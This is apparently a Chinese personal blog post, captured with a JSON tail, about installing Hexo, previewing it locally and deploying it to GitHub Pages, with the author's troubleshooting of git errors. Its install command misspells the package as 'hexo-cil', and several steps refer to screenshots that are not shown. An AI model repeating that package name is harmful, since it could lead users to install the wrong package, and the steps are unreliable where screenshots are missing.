这是安装hexo不要在安装到c盘了，因为c盘系统文件太多，不敢乱删，而且找hexo所在文件也不太好找到。我是在D盘建了一个blog文件夹，将hexo安装在这里面。接下来打开cmd 12345C:\\Users\\用户名&gt;D:D:\\&gt;cd blogD:\\blog&gt;npm install hexo-cil -g 首先你得先进入对应的目录，然后输入npm install hexo-cil -g命令即可安装hexo.接下来照着这些命令往下走，第二条命令作用是初始化。最好第二条命令 hexo init 博客名（注册的名字），这样好区分一点。 1INFO start 博客名 with Hexo! 显示出这个时，初始化已完成。 12cd 博客名npm install 待安装好后，本地运行一下，看是否成功。输入1hexo s 显示出 123D:\\blog\\bealright&gt;hexo sINFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. 打开http://localhost:4000/，如果出现这个画面，恭喜创建成功。![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/photo/7.png?raw=true)因为换了主题的缘故，所以不再是hexo的官方主题，不过只要出现画面就成功了。 六 安装sublime sublime官网下载这个软件有很大用处，无需在记事本了修改配置文件，直接在sublime里修改更方便一些。不过下载这个也要翻墙，所以推荐百度网盘下载。下载好后，找到你安装hexo的目录直接拖进sublime里。就会显示出类似这个的图片。 七 hexo发布到github上 这是最后一步了，看似是胜利女神在向你招手，但你永远也不会知道前面是结束还是会继续掉坑。打开sublime,找到这个然后将最下面的代码改为这样注意： repo里的bealright是我的用户名，改成注册时的用户名就好了。还有一处地方也需要改照这这个格式，把自己的用户名更改了即可（bealright是我自己的用户名）。再打开cmd,输入 123456789hexo gINFO Start processingINFO Files loaded in 124 msINFO Generated: archives/2019/index.htmlINFO Generated: archives/index.htmlINFO Generated: archives/2019/03/index.htmlINFO Generated: index.htmlINFO Generated: 2019/03/16/cmd中操作数据库的那些常见命令/index.htmlINFO 5 files generated in 254 ms 会出现类似的东西（我的创建完成所以会不一样），不要管他。继续输入 1hexo d 此时会出现 1ERROR Deployer not found git 原因在于还少了一个插件到官网下载插件进入hexo文档官网hexo文档官网将命令输入到cmd中即可安装。会有一点慢，等待一会就好。安装好之后，输入 1hexo d 这一步就要看你运气了，我在这里卡了一个晚上 + 一个下午😂。如果出现这个的话恭喜你，运气很好（哈哈），接下只需要输入 12345git config --global user.email \"你的邮件\"回车git config --global user.name \"你的用户名\"再次输入 hexo d会弹出这样的窗口 输入即可进入你的博客了。（好幸运呀）但我遇到的是这样的😤马上就成功了，前面却是这个，好让人心急。不过不要着急，互联网这么强大，大佬那么多，总会有解决方法。冷静下来进行分析。咦，发现问题了。原来是git命令不能用，查了很多文章，我找到了二个解决方法。一：把git for windows 给卸载了重新安装，上文说之所以安装git for windows一路next 不要换路径原因就在这。还有一个就是在这里面输入这里面自带git命令，123重新输入hexo ghexo d 不过让人郁闷的是😱这个git命令解决后。。。还有问题。。。（我要郁闷死😭）同寝室人一个坑没掉过，我一路跌坑。请看新问题。。。我。。。不会吧，又出现这个问题。。。怎么办，都到最后一步了。不放弃继续查，bing\\谷歌\\百度各种查，问学长学姐，加hexo群询问。。。😥不过在耐心快被磨完时，我找到解决方案了。这就是解决方案。当时也不太理解，不过得去尝试，不去尝试怎么知道行不行。首先将删除新建一个文件夹然后下载把下载的内容放在你新建的文件夹里面。再次运行 12hexo ghexo d 当时的心情是快点好吧，大哥求你了😂结果奇迹出现了只不过我的和其他人登陆有点不一样。。。输入的账号，密码全对，结果。。。崩溃的边缘。。。我实在无语，然后输入了自己的用户名bealright（没事的）。。。我遇到的都是事😂突然弹出一个窗口输入密码后，成功了。。。这个过程完成后，感悟真的很多。也许前方无数的bug\\error在等着我，但是只要保持耐心，不断努力，最终会解决他们的。共勉一句我特别喜欢的英语名言No attempt, no success没有尝试，没有成功","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://bealright.github.io/tags/hexo/"}]}]}